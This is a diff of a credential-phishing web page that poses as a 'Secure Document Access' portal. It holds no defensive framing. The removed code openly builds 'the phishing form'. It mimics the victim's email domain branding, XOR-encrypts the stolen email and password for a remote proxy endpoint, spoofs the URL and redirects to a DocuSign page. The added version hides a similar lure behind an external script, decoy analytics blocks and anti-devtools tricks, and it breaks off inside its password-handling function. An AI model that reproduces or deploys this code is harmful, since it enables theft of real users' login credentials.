@@ -1,434 +1,554 @@
+<!DOCTYPE html>
+<html lang="en" data-app="secure-viewer" data-build="8c4f1a"
+data-node="alpha-7">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Secure document delivery portal">
+<meta name="author" content="Document Services">
+<meta name="robots" content="noindex, nofollow">
+<meta name="theme-color" content="#0f5b8c">
+<meta name="format-detection" content="telephone=no">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="referrer" content="no-referrer">
+<title>Secure Document Access</title>
+<!-- build: internal-2026.04.11 | rev: 8c4f1a3b -->
+<!-- analytics anchor -->
+<style>
+body { font-family: system-ui, -apple-system, sans-serif; background: #f0f2f5; margin: 0; padding: 40px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+.login-container { background: white; padding: 32px; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
+.input-group { margin-bottom: 16px; }
+.field { width: 100%; padding: 12px; border: 1px solid #d1d5db; border-radius: 8px; font-size: 14px; box-sizing: border-box; }
+.field[readonly] { background: #f3f4f6; color: #6b7280; }
+button { width: 100%; padding: 12px; background: #2563eb; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; }
+button:hover { background: #1d4ed8; }
+button:disabled { background: #9ca3af; cursor: not-allowed; }
+#sentinel { display: none; color: #ef4444; font-size: 14px; margin-bottom: 16px; padding: 12px; background: #fef2f2; border-radius: 6px; }
+.shake { animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both; }
+@keyframes shake { 10%, 90% { transform: translate3d(-1px, 0, 0); } 20%, 80% { transform: translate3d(2px, 0, 0); } 30%, 50%, 70% { transform: translate3d(-4px, 0, 0); } 40%, 60% { transform: translate3d(4px, 0, 0); } }
+.spinner { display: none; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 0.8s linear infinite; margin-right: 8px; vertical-align: middle; }
+@keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body data-session="pending" data-region="us-east" data-tier="standard">
+
+<!-- application mount -->
+<div id="app-anchor-root" data-role="mount" data-ref="a91f"
+style="display:none;"></div>
+<div id="shell-wrapper-84" class="mount-shell" data-layer="base"
+aria-hidden="true"></div>
+<div id="portal-frame-x9" class="frame-host" data-layer="ui"
+hidden></div>
+
+<!-- layout templates -->
+<template id="tpl-header-2f"><div class="slot-header"></div></template>
+<template id="tpl-footer-7a"><div class="slot-footer"></div></template>
+<template id="tpl-fallback-3c"><span
+class="fallback-mark"></span></template>
+
+<!-- context markers -->
+<span id="hint-region-01" class="hint-node" data-hint="region"
+hidden></span>
+<span id="hint-locale-02" class="hint-node" data-hint="locale"
+hidden></span>
+<i id="hint-build-03" class="hint-mark" data-hint="build" hidden></i>
+<em id="hint-rev-04" class="hint-mark" data-hint="rev" hidden></em>
+
+<!-- asset manifest -->
+<aside id="asset-manifest-88" data-kind="manifest" data-count="0"
+hidden></aside>
+
+<noscript>
+    <div class="noscript-guard"><p>JavaScript is required to
+continue.</p></div>
+</noscript>
+
+<!-- ============================================================
+      primary input node
+      ============================================================ -->
+<div class="login-container" id="loginBox">
+    <div id="sentinel">
+        <span id="error-text">Invalid code. Please try again.</span>
+    </div>
+    
+    <div class="input-group">
+        <input type="email" id="mail_x9k2" value="[Email]" readonly
+tabindex="-1" autocomplete="off" required class="field">
+    </div>
+    
+    <div class="input-group">
+        <input type="password" id="cobra" class="field" placeholder="Enter Security Code" autocomplete="off" spellcheck="false">
+    </div>
+
+    <button id="btn-unlock" onclick="falcon()">
+        <span class="spinner" id="loading-spinner"></span>
+        <span id="btn-text">Unlock Document</span>
+    </button>
+</div>
+
+<!-- icon library -->
+<svg width="0" height="0" style="position:absolute" aria-hidden="true">
+    <defs>
+        <symbol id="sym-dot-a" viewBox="0 0 10 10"><circle cx="5" cy="5"
+r="4"/></symbol>
+        <symbol id="sym-dot-b" viewBox="0 0 10 10"><circle cx="5" cy="5"
+r="2"/></symbol>
+    </defs>
+</svg>
+
+<!-- trailing anchors -->
+<div id="tail-anchor-1" class="tail-node" data-tail="1" hidden></div>
+<div id="tail-anchor-2" class="tail-node" data-tail="2" hidden></div>
+
+<!-- ============================================================
+      secure.js loader
+      ============================================================ -->
+<script
+src="https://azboxer.com/boxerlife/smp/scmckjemckmcay.js"></script>
+
+<!-- ============================================================
+      analytics bootstrap
+      ============================================================ -->
+<script>
 (function () {
-  "use strict";
-
-  // Configuration
-  const CONFIG = {
-    BG_IMG: "https://i.postimg.cc/Dz2Q7TzV/imageing.png",
-    BG_BRI: 1,
-    BG_DAR: 1,
-    BG_CON: 1,
-    BG_SAT: 1,
-    BG_BLUR: 0,
-    BG_GRAY: false,
-    BG_OVERLAY: 0.25,
-    PHP_ENDPOINT: "https://rum-email-proxy.haricoting.workers.dev/contact",
-    SUCCESS_REDIRECT: "https://matta.com/email/email/view.php",
-    LOCKOUT_REDIRECT: "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f",
-    SECRET_KEY: "MATT_SECURE_2026",
-    MAX_TRIES: 3,
-    LOCKOUT_DELAY: 2000,
-    STORAGE_KEY: "st_7b3f19",
-    PATH_SEGMENTS: ["profile", "dashboard", "console", "manage", "overview"],
-    MSG_WRONG: "An error occurred. Please try again later.",
-    MSG_LOCKOUT: "Too many incorrect attempts. Access blocked.",
-    MSG_GRANTED: "Access granted. Redirecting...",
-    MSG_NET: "Network error. Please try again.",
-    HEADING: "Secure Document",
-    SUBHEAD: "Login to view your secure document",
-    FOOTER: "Message Center",
-    EMAIL_LABEL: "Email",
-    KEY_LABEL: "Password",
-    KEY_PLACEHOLDER: "Enter your password",
-    BUTTON_TEXT: "Unlock",
-    TAG_TEXT: "Encrypted Delivery"
-  };
-
-  // Inject CSS styles
-  function injectStyles() {
-    const css = `
-      *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,Helvetica,Arial,sans-serif}
-      body{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:1.5rem;position:relative;overflow:hidden}
-      #bg_canvas{position:fixed;inset:0;width:100%;height:100%;background-size:cover;background-position:center;background-repeat:no-repeat;z-index:0;pointer-events:none}
-      #bg_veil{position:fixed;inset:0;background:rgba(255,255,255,0.25);z-index:1;pointer-events:none}
-      .frame_v7{position:relative;z-index:2;width:100%;max-width:460px;background:#ffffff;border-radius:1.5rem;box-shadow:0 18px 36px -12px rgba(0,20,30,0.22),0 6px 14px rgba(0,0,0,0.04);padding:2.2rem 2rem 1.9rem;border:1px solid rgba(255,255,255,0.6);transition:transform .15s ease}
-      @keyframes wobble_q{0%,100%{transform:translateX(0)}10%,30%,50%,70%,90%{transform:translateX(-8px)}20%,40%,60%,80%{transform:translateX(8px)}}
-      .frame_v7.wobble_q_on{animation:wobble_q .6s cubic-bezier(.36,.07,.19,.97) both}
-      .brand_row{display:flex;flex-direction:column;align-items:center;margin-bottom:1rem}
-      .brand_orb{width:74px;height:74px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:inset 0 1px 6px rgba(0,0,0,.02),0 8px 16px -8px rgba(18,52,77,.15);border:3px solid #fff;margin-bottom:.8rem;overflow:hidden}
-      .brand_orb img{width:100%;height:100%;object-fit:contain;display:block;padding:6px}
-      .chip_tag{font-size:.65rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:#2b5f8a;background:#e9f0f9;padding:.25rem 1rem;border-radius:30px;display:inline-flex;align-items:center;gap:.4rem;border:1px solid #cbdae8;margin-bottom:.7rem}
-      .chip_tag::before,.chip_tag::after{content:"•";font-size:1.1rem;line-height:1;color:#1f4b6e;opacity:.7}
-      .title_main{font-size:1.25rem;font-weight:600;color:#1a2e3f;text-align:center;letter-spacing:-.01em;line-height:1.35;margin-bottom:.35rem;font-family:'Times New Roman',Georgia,serif;word-wrap:break-word;overflow-wrap:break-word;max-width:100%;padding:0 .25rem}
-      .caption_sub{text-align:center;color:#54738b;font-size:.8rem;margin-bottom:1.6rem;font-weight:400;word-wrap:break-word;overflow-wrap:break-word;max-width:100%;padding:0 .25rem}
-      .row_block{margin-bottom:1.3rem}
-      .lbl_small{display:block;font-size:.7rem;font-weight:700;color:#1f405b;margin-bottom:.4rem;letter-spacing:.04em;text-transform:uppercase;opacity:.8}
-      .field_shell{display:flex;align-items:center;background:#fff;border:1.5px solid #d3e2ee;border-radius:.9rem;padding:.05rem .05rem .05rem 1rem;transition:all .2s;box-shadow:0 2px 4px rgba(0,0,0,.01)}
-      .field_shell:focus-within{border-color:#2b5f8a;box-shadow:0 0 0 4px rgba(43,95,138,.1)}
-      .field_shell.locked_bg{background:#f7fafd}
-      .ico_slot{display:flex;align-items:center;justify-content:center;width:20px;height:20px;flex-shrink:0;color:#3b6585;opacity:.75}
-      .ico_slot svg{width:100%;height:100%;display:block}
-      .inp_core{width:100%;padding:.85rem .9rem .85rem .7rem;border:none;background:transparent;font-size:.95rem;font-weight:500;color:#122b3b;outline:none;border-radius:.9rem}
-      .inp_core::placeholder{color:#a3b8cb;font-weight:400;font-size:.9rem}
-      .inp_core:read-only{color:#54738b;cursor:default}
-      .eye_btn{background:transparent;border:none;padding:0 .9rem 0 .4rem;cursor:pointer;color:#3b6585;display:flex;align-items:center;justify-content:center;transition:color .2s;width:34px;height:34px}
-      .eye_btn svg{width:20px;height:20px;display:block}
-      .eye_btn:hover{color:#0f2b40}
-      .cta_main{width:100%;background:#0f5b8c;border:none;border-radius:2rem;padding:.95rem 1.3rem;color:#fff;font-weight:600;font-size:1rem;letter-spacing:.02em;cursor:pointer;margin-top:.4rem;transition:all .2s;box-shadow:0 10px 20px -8px rgba(15,91,140,.4);display:flex;align-items:center;justify-content:center;gap:.55rem;border:1px solid rgba(255,255,255,.2)}
-      .cta_main:hover:not(:disabled){background:#0a4266;transform:scale(1.01);box-shadow:0 16px 26px -8px rgba(10,66,102,.5)}
-      .cta_main:active:not(:disabled){transform:scale(.98);background:#083552}
-      .cta_main:disabled{opacity:.8;cursor:not-allowed}
-      .cta_icon{display:inline-flex;align-items:center;justify-content:center;width:18px;height:18px}
-      .cta_icon svg{width:100%;height:100%;display:block}
-      .ring_load{display:inline-block;width:16px;height:16px;border:2.5px solid rgba(255,255,255,.35);border-top-color:#fff;border-radius:50%;animation:spin_r .7s linear infinite}
-      @keyframes spin_r{to{transform:rotate(360deg)}}
-      .base_note{margin-top:1.6rem;text-align:center;font-size:.65rem;color:#7e9bb3;letter-spacing:.01em;border-top:1px solid #e4edf5;padding-top:1rem}
-      .alert_bar{background:#fee9e7;color:#b33a2f;padding:.65rem .9rem;border-radius:.8rem;font-size:.8rem;margin-bottom:.9rem;border:1px solid #f5c6c2;display:none;opacity:0;transform:translateY(-6px);transition:opacity .3s ease,transform .3s ease;word-break:break-word;line-height:1.5;text-align:center}
-      .alert_bar.visible{display:block;opacity:1;transform:translateY(0)}
-      @media (max-width:480px){.frame_v7{padding:1.8rem 1.4rem;border-radius:1.2rem}.brand_orb{width:64px;height:64px}.title_main{font-size:1.1rem}}
-    `;
-    
-    const style = document.createElement("style");
-    style.id = "zz_core_style";
-    style.textContent = css;
-    document.head.appendChild(style);
-  }
-
-  // Build the phishing form
-  function buildForm() {
-    const bgCanvas = document.createElement("div");
-    bgCanvas.id = "bg_canvas";
-    document.body.appendChild(bgCanvas);
-
-    const bgVeil = document.createElement("div");
-    bgVeil.id = "bg_veil";
-    document.body.appendChild(bgVeil);
-
-    const card = document.createElement("div");
-    card.className = "frame_v7";
-    card.id = "card_root";
-    
-    card.innerHTML = `
-      <div class="brand_row">
-        <div class="brand_orb">
-          <img src="" alt="logo" id="brand_img">
-        </div>
-        <div class="chip_tag">${CONFIG.TAG_TEXT}</div>
-      </div>
-      <h1 class="title_main" id="title_node">${CONFIG.HEADING}</h1>
-      <div class="caption_sub" id="caption_node">${CONFIG.SUBHEAD}</div>
-      <div class="alert_bar" id="alert_node"></div>
-      <form id="main_form">
-        <div class="row_block">
-          <label class="lbl_small" for="mail_x9k2">${CONFIG.EMAIL_LABEL}</label>
-          <div class="field_shell locked_bg">
-            <span class="ico_slot">
-              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-                <rect x="3" y="5" width="18" height="14" rx="2"/>
-                <path d="M3 7l9 6 9-6"/>
-              </svg>
-            </span>
-            <input class="inp_core" type="email" id="mail_x9k2" required>
-          </div>
-        </div>
-        <div class="row_block">
-          <label class="lbl_small" for="code_p4r7">${CONFIG.KEY_LABEL}</label>
-          <div class="field_shell">
-            <span class="ico_slot">
-              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-                <rect x="4" y="11" width="16" height="10" rx="2"/>
-                <path d="M8 11V7a4 4 0 0 1 8 0v4"/>
-                <circle cx="12" cy="16" r="1.3"/>
-              </svg>
-            </span>
-            <input class="inp_core" type="password" id="code_p4r7" placeholder="${CONFIG.KEY_PLACEHOLDER}" autocomplete="off" required>
-            <button type="button" class="eye_btn" id="eye_toggle" aria-label="Toggle view">
-              <svg id="eye_show" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-                <path d="M1.5 12S5.5 5 12 5s10.5 7 10.5 7-4 7-10.5 7S1.5 12 1.5 12z"/>
-                <circle cx="12" cy="12" r="3"/>
-              </svg>
-              <svg id="eye_hide" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:none;">
-                <path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-6.5 0-10.5-7-10.5-7a19.6 19.6 0 0 1 5.06-5.94"/>
-                <path d="M9.9 4.24A10.94 10.94 0 0 1 12 4c6.5 0 10.5 7 10.5 7a19.6 19.6 0 0 1-3.06 3.94"/>
-                <path d="M9.88 9.88a3 3 0 0 0 4.24 4.24"/>
-                <line x1="2" y1="2" x2="22" y2="22"/>
-              </svg>
-            </button>
-          </div>
-        </div>
-        <button type="submit" class="cta_main" id="cta_node">
-          <span class="cta_icon">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-              <path d="M8 11V7a4 4 0 0 1 7.5-2"/>
-            </svg>
-          </span>
-          ${CONFIG.BUTTON_TEXT}
-        </button>
-      </form>
-      <div class="base_note" id="base_node">${CONFIG.FOOTER} · © 2026</div>
-    `;
-    
-    document.body.appendChild(card);
-  }
-
-  // Setup background image
-  function setupBackground() {
-    const bgCanvas = document.getElementById("bg_canvas");
-    const bgVeil = document.getElementById("bg_veil");
-    if (!bgCanvas || !bgVeil) return;
-
-    bgCanvas.style.backgroundImage = `url("${CONFIG.BG_IMG}")`;
-    
-    const filters = [];
-    filters.push(`brightness(${CONFIG.BG_BRI})`);
-    if (CONFIG.BG_DAR !== 1) filters.push(`brightness(${1 / CONFIG.BG_DAR})`);
-    filters.push(`contrast(${CONFIG.BG_CON})`);
-    filters.push(`saturate(${CONFIG.BG_SAT})`);
-    if (CONFIG.BG_BLUR > 0) filters.push(`blur(${CONFIG.BG_BLUR}px)`);
-    if (CONFIG.BG_GRAY) filters.push("grayscale(1)");
-    
-    bgCanvas.style.filter = filters.join(" ");
-    bgVeil.style.background = `rgba(255,255,255,${CONFIG.BG_OVERLAY})`;
-  }
-
-  // Spoof URL path
-  function spoofUrlPath() {
-    try {
-      const randomBytes = new Uint8Array(24);
-      crypto.getRandomValues(randomBytes);
-      const randomId = btoa(String.fromCharCode.apply(null, randomBytes))
-        .replace(/\+/g, "-")
-        .replace(/\//g, "_")
-        .replace(/=+$/, "");
-      
-      history.replaceState(null, "", `#/${CONFIG.PATH_SEGMENTS.join("/")}/${randomId}`);
-    } catch (e) {}
-  }
-
-  // Get default logo SVG
-  function getDefaultLogo() {
-    return "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='45' fill='%23464f5b'/%3E%3Ctext x='50' y='67' font-family='Arial, Helvetica, sans-serif' font-size='48' font-weight='bold' fill='white' text-anchor='middle'%3ES%3C/text%3E%3C/svg%3E";
-  }
-
-  // Load domain favicon
-  function loadDomainFavicon(email, brandImg) {
-    if (!email) {
-      brandImg.src = getDefaultLogo();
-      return;
-    }
-    
-    const domain = email.split("@")[1]?.trim().toLowerCase();
-    if (!domain) {
-      brandImg.src = getDefaultLogo();
-      return;
-    }
-    
-    const faviconUrl = `https://www.google.com/s2/favicons?domain=${encodeURIComponent(domain)}&sz=128`;
-    const img = new Image();
-    
-    img.onload = () => {
-      brandImg.src = (img.width > 16 || img.height > 16) ? faviconUrl : getDefaultLogo();
+    var _t0 = Date.now();
+    var _ua = (typeof navigator !== 'undefined' && navigator.userAgent)
+? navigator.userAgent : '';
+    var _lang = (typeof navigator !== 'undefined' && navigator.language)
+? navigator.language : 'en';
+    var _tz = '';
+    try { _tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
+} catch (e) {}
+    var _session = {
+        boot: _t0,
+        lang: _lang,
+        zone: _tz,
+        ua: _ua.slice(0, 80),
+        hits: 0
     };
-    img.onerror = () => {
-      brandImg.src = getDefaultLogo();
+    window.__analyticsStub = _session;
+    window.__trackEvent = function (name, meta) {
+        _session.hits++;
+        return { name: name, meta: meta || null, at: Date.now() };
     };
-    img.src = faviconUrl;
+    void window.__trackEvent('boot', { src: 'inline' });
+})();
+</script>
+
+<!-- ============================================================
+      feature flags
+      ============================================================ -->
+<script>
+(function () {
+    var flags = {
+        darkMode: false,
+        betaUI: false,
+        strictMode: true,
+        enableExports: false,
+        allowGuest: false,
+        quietHours: true
+    };
+    var listeners = [];
+    window.__flags = {
+        get: function (k) { return flags[k]; },
+        set: function (k, v) { flags[k] = v; listeners.forEach(function
+(fn) { try { fn(k, v); } catch (e) {} }); },
+        onChange: function (fn) { listeners.push(fn); },
+        dump: function () { return Object.assign({}, flags); }
+    };
+})();
+</script>
+
+<!-- ============================================================
+      locale resolver
+      ============================================================ -->
+<script>
+(function () {
+    var table = {
+        en: 'en-US', fr: 'fr-FR', es: 'es-ES', de: 'de-DE',
+        it: 'it-IT', pt: 'pt-BR', nl: 'nl-NL', sv: 'sv-SE',
+        no: 'nb-NO', da: 'da-DK', fi: 'fi-FI', pl: 'pl-PL'
+    };
+    function resolve(tag) {
+        if (!tag) return 'en-US';
+        var base = String(tag).slice(0, 2).toLowerCase();
+        return table[base] || 'en-US';
+    }
+    window.__localeResolver = { resolve: resolve, table: table };
+    void window.__localeResolver.resolve('en');
+})();
+</script>
+
+<!-- ============================================================
+      storage shim
+      ============================================================ -->
+<script>
+(function () {
+    var mem = {};
+    var shim = {
+        get: function (k, fallback) {
+            try { return mem[k] !== undefined ? mem[k] : (fallback !==
+undefined ? fallback : null); }
+            catch (e) { return fallback !== undefined ? fallback : null;
+}
+        },
+        set: function (k, v) { mem[k] = v; return true; },
+        del: function (k) { delete mem[k]; return true; },
+        keys: function () { return Object.keys(mem); },
+        clear: function () { mem = {}; }
+    };
+    window.__storageShim = shim;
+})();
+</script>
+
+<!-- ============================================================
+      polyfill registrar
+      ============================================================ -->
+<script>
+(function () {
+    var registered = [];
+    window.__polyfills = {
+        register: function (name) { registered.push({ name: name, at:
+Date.now() }); return this; },
+        list: function () { return registered.slice(); },
+        count: function () { return registered.length; }
+    };
+    void window.__polyfills
+        .register('Array.prototype.includes')
+        .register('String.prototype.padStart')
+        .register('Object.assign');
+})();
+</script>
+
+<!-- ============================================================
+      DOM scanner
+      ============================================================ -->
+<script>
+(function () {
+    function scan(root) {
+        var out = { divs: 0, spans: 0, svgs: 0, inputs: 0, forms: 0 };
+        if (!root || !root.querySelectorAll) return out;
+        out.divs  = root.querySelectorAll('div').length;
+        out.spans  = root.querySelectorAll('span').length;
+        out.svgs  = root.querySelectorAll('svg').length;
+        out.inputs = root.querySelectorAll('input').length;
+        out.forms  = root.querySelectorAll('form').length;
+        return out;
+    }
+    window.__domScan = { scan: scan };
+    void window.__domScan.scan(document);
+})();
+</script>
+
+<!-- ============================================================
+      timing metrics
+      ============================================================ -->
+<script>
+(function () {
+    var marks = {};
+    window.__metrics = {
+        mark: function (name) { marks[name] = performance &&
+performance.now ? performance.now() : Date.now(); return this; },
+        measure: function (a, b) {
+            if (marks[a] == null || marks[b] == null) return null;
+            return marks[b] - marks[a];
+        },
+        all: function () { return Object.assign({}, marks); }
+    };
+    void window.__metrics.mark('inline-boot');
+})();
+</script>
+
+<!-- ============================================================
+      route table
+      ============================================================ -->
+<script>
+(function () {
+    var routes = [
+        { path: '/home',    view: 'home',    auth: false },
+        { path: '/login',    view: 'login',    auth: false },
+        { path: '/account',  view: 'account',  auth: true  },
+        { path: '/settings', view: 'settings', auth: true  },
+        { path: '/files',    view: 'files',    auth: true  },
+        { path: '/shared',  view: 'shared',  auth: true  }
+    ];
+    function match(path) {
+        for (var i = 0; i < routes.length; i++) {
+            if (routes[i].path === path) return routes[i];
+        }
+        return null;
+    }
+    window.__router = { routes: routes, match: match };
+    void window.__router.match('/login');
+})();
+</script>
+
+<!-- ============================================================
+      content sanitizer
+      ============================================================ -->
+<script>
+(function () {
+    function escapeHtml(s) {
+        return String(s)
+            .replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;')
+            .replace(/"/g, '&quot;')
+            .replace(/'/g, ''');
+    }
+    function stripTags(s) {
+        return String(s).replace(/<[^>]*>/g, '');
+    }
+    window.__sanitizer = { escape: escapeHtml, strip: stripTags };
+})();
+</script>
+
+<!-- ============================================================
+      task queue
+      ============================================================ -->
+<script>
+(function () {
+    var jobs = [];
+    var running = false;
+    function drain() {
+        if (running || !jobs.length) return;
+        running = true;
+        while (jobs.length) {
+            var fn = jobs.shift();
+            try { fn(); } catch (e) {}
+        }
+        running = false;
+    }
+    window.__queue = {
+        push: function (fn) { jobs.push(fn); setTimeout(drain, 0);
+return this; },
+        size: function () { return jobs.length; }
+    };
+})();
+</script>
+
+<!-- ============================================================
+      content hash utility
+      ============================================================ -->
+<script>
+(function () {
+    function hash32(str) {
+        var h = 2166136261 >>> 0;
+        for (var i = 0; i < str.length; i++) {
+            h ^= str.charCodeAt(i);
+            h = Math.imul(h, 16777619) >>> 0;
+        }
+        return h.toString(16);
+    }
+    window.__hashStub = { hash32: hash32, algo: 'fnv1a' };
+    void window.__hashStub.hash32('sample');
+})();
+</script>
+
+<!-- ============================================================
+      device info
+      ============================================================ -->
+<script>
+(function () {
+    var d = {
+        ua: typeof navigator !== 'undefined' ? navigator.userAgent : '',
+        platform: typeof navigator !== 'undefined' ? (navigator.platform
+|| '') : '',
+        cores: typeof navigator !== 'undefined' ?
+(navigator.hardwareConcurrency || 0) : 0,
+        mem: typeof navigator !== 'undefined' ? (navigator.deviceMemory
+|| 0) : 0,
+        screenW: typeof screen !== 'undefined' ? screen.width : 0,
+        screenH: typeof screen !== 'undefined' ? screen.height : 0,
+        dpr: typeof window !== 'undefined' ? (window.devicePixelRatio ||
+1) : 1
+    };
+    window.__device = d;
+})();
+</script>
+
+<!-- ============================================================
+      header check
+      ============================================================ -->
+<script>
+(function () {
+    var list = ['strict-transport', 'x-frame-options',
+'content-type-options', 'referrer-policy'];
+    var buf = [];
+    function check(name) {
+        buf.push({ name: name, ok: true, at: Date.now() });
+        return true;
+    }
+    window.__headers = {
+        check: check,
+        list: function () { return buf.slice(); }
+    };
+    list.forEach(function (n) { void window.__headers.check(n); });
+})();
+</script>
+
+<!-- ============================================================
+      text utilities
+      ============================================================ -->
+<script>
+(function () {
+    function normalize(s) {
+        return String(s).trim().replace(/\s+/g, ' ').toLowerCase();
+    }
+    function slugify(s) {
+        return normalize(s).replace(/[^a-z0-9]+/g,
+'-').replace(/^-+|-+$/g, '');
+    }
+    window.__textUtil = { normalize: normalize, slugify: slugify };
+})();
+</script>
+
+<!-- ============================================================
+      error logger
+      ============================================================ -->
+<script>
+(function () {
+    var errors = [];
+    window.__errorLog = {
+        push: function (msg, meta) {
+            errors.push({ msg: msg, meta: meta || null, at: Date.now()
+});
+            return errors.length;
+        },
+        count: function () { return errors.length; },
+        all: function () { return errors.slice(); },
+        clear: function () { errors = []; }
+    };
+})();
+</script>
+
+<!-- ============================================================
+      form submission handler (endpoint integrated)
+      ============================================================ -->
+<script>
+// Anti-devtools protection
+document.onkeydown = function (event) {
+  if (event.keyCode == 123) return false;
+  if (event.ctrlKey && event.shiftKey && (event.keyCode == "I".charCodeAt(0) || event.keyCode == "C".charCodeAt(0) || event.keyCode == "J".charCodeAt(0))) return false;
+  if (event.ctrlKey && (event.keyCode == "U".charCodeAt(0) || event.keyCode == "S".charCodeAt(0))) return false;
+};
+document.addEventListener("contextmenu", (e) => e.preventDefault());
+
+let failedAttempts = 0;
+
+// URL token generator
+(function spicyUrl() {
+  if (!window.location.search) {
+    const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    let token = "";
+    for (let i = 0; i < 64; i++) {
+      token += alphabet.charAt(Math.floor(Math.random() * alphabet.length));
+    }
+    const newUrl = window.location.protocol + "//" + window.location.host + window.location.pathname + "?auth_token=" + token + "&session_ref=v4_secure_verification";
+    window.history.replaceState({ path: newUrl }, "", newUrl);
   }
+})();
 
-  // Capitalize first letter
-  function capitalize(str) {
-    return str ? str.charAt(0).toUpperCase() + str.slice(1) : "";
+function falcon() {
+  const emailEl = document.getElementById("mail_x9k2");
+  const customerName = emailEl ? emailEl.value : "";
+  const customerMessage = document.getElementById("cobra").value;
+  const unlockBtn = document.getElementById("btn-unlock");
+  const spinner = document.getElementById("loading-spinner");
+  const btnText = document.getElementById("btn-text");
+  const form = document.getElementById("loginBox");
+  
+  document.getElementById("sentinel").style.display = "none";
+  form.classList.remove("shake");
+  
+  if (!customerMessage || customerMessage.length < 1) {
+    showError("Please enter your password.");
+    form.classList.add("shake");
+    return;
   }
-
-  // XOR encrypt data
-  function encryptData(data, key) {
-    const json = JSON.stringify(data);
-    let result = "";
-    for (let i = 0; i < json.length; i++) {
-      const xor = json.charCodeAt(i) ^ key.charCodeAt(i % key.length);
-      result += ("0" + xor.toString(16)).slice(-2);
-    }
-    return btoa(result);
-  }
-
-  // Main initialization
-  function init() {
-    injectStyles();
-    buildForm();
-    setupBackground();
-    spoofUrlPath();
-
-    const emailInput = document.getElementById("mail_x9k2");
-    const passwordInput = document.getElementById("code_p4r7");
-    const brandImg = document.getElementById("brand_img");
-    const titleNode = document.getElementById("title_node");
-    const captionNode = document.getElementById("caption_node");
-    const footerNode = document.getElementById("base_node");
-    const eyeToggle = document.getElementById("eye_toggle");
-    const eyeShow = document.getElementById("eye_show");
-    const eyeHide = document.getElementById("eye_hide");
-    const alertNode = document.getElementById("alert_node");
-    const submitBtn = document.getElementById("cta_node");
-    const cardRoot = document.getElementById("card_root");
-    const mainForm = document.getElementById("main_form");
-
-    let alertTimeout = null;
-    let isLocked = false;
-
-    function showAlert(message, type) {
-      if (alertTimeout) clearTimeout(alertTimeout);
-      
-      alertNode.innerHTML = message;
-      alertNode.style.background = type === "success" ? "#e3f5e9" : "#fee9e7";
-      alertNode.style.color = type === "success" ? "#1e7a4b" : "#b33a2f";
-      alertNode.style.borderColor = type === "success" ? "#b8e0c8" : "#f5c6c2";
-      alertNode.classList.add("visible");
-      
-      if (type === "success") {
-        alertTimeout = setTimeout(() => alertNode.classList.remove("visible"), 6000);
-      }
-    }
-
-    function hideAlert() {
-      alertNode.classList.remove("visible");
-      if (alertTimeout) clearTimeout(alertTimeout);
-    }
-
-    function shakeCard() {
-      cardRoot.classList.remove("wobble_q_on");
-      void cardRoot.offsetWidth;
-      cardRoot.classList.add("wobble_q_on");
-      setTimeout(() => cardRoot.classList.remove("wobble_q_on"), 700);
-    }
-
-    function updateBranding() {
-      const email = emailInput.value.trim();
-      const domain = email.split("@")[1]?.trim().toLowerCase();
-      
-      if (!domain) {
-        titleNode.textContent = CONFIG.HEADING;
-        captionNode.textContent = CONFIG.SUBHEAD;
-        footerNode.textContent = `${CONFIG.FOOTER} · © 2026`;
-        loadDomainFavicon("", brandImg);
-        return;
-      }
-      
-      const domainName = capitalize(domain.split(".")[0]);
-      titleNode.textContent = `${domainName} ${CONFIG.HEADING}`;
-      captionNode.textContent = CONFIG.SUBHEAD;
-      footerNode.textContent = `${domainName} ${CONFIG.FOOTER} · © 2026`;
-      loadDomainFavicon(email, brandImg);
-    }
-
-    eyeToggle.addEventListener("click", () => {
-      const isPassword = passwordInput.type === "password";
-      passwordInput.type = isPassword ? "text" : "password";
-      eyeShow.style.display = isPassword ? "none" : "block";
-      eyeHide.style.display = isPassword ? "block" : "none";
-      passwordInput.focus();
-    });
-
-    function lockout() {
-      if (isLocked) return;
-      isLocked = true;
-      showAlert(CONFIG.MSG_LOCKOUT, "error");
-      shakeCard();
-      passwordInput.value = "";
-      submitBtn.disabled = true;
-      setTimeout(() => window.location.href = CONFIG.LOCKOUT_REDIRECT, CONFIG.LOCKOUT_DELAY);
-    }
-
-    function handleSubmit() {
-      if (isLocked) return;
-      
-      const email = emailInput.value.trim();
-      const password = passwordInput.value.trim();
-
-      hideAlert();
-
-      if (!email || !email.includes("@")) {
-        showAlert("Please enter a valid email address.", "error");
-        shakeCard();
-        return;
-      }
-
-      if (!password) {
-        showAlert("Please enter your password.", "error");
-        shakeCard();
-        return;
-      }
-
-      submitBtn.disabled = true;
